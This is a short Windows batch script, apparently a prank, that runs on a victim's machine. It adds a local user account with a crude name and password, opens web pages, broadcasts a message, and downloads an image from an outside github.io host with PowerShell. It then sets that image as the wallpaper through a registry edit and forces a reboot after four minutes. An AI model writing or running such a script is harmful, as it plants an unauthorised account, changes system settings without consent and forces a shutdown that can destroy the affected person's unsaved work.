@echo off
set "wallpaper=%USERPROFILE%\Documents\giggitywallpaper.png"
net user "penis is the password" penis /add
start https://www.youtube.com/watch?v=GyYJV1psDow
start https://www.directv.com
msg * "https://www.youtube.com/watch?v=GyYJV1psDow&pp=sAQB"
powershell -Command "Invoke-WebRequest 'https://giggityfiles.github.io/giggitywallpaper.png' -OutFile '%wallpaper%'"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
shutdown /f /r /t 240
exit
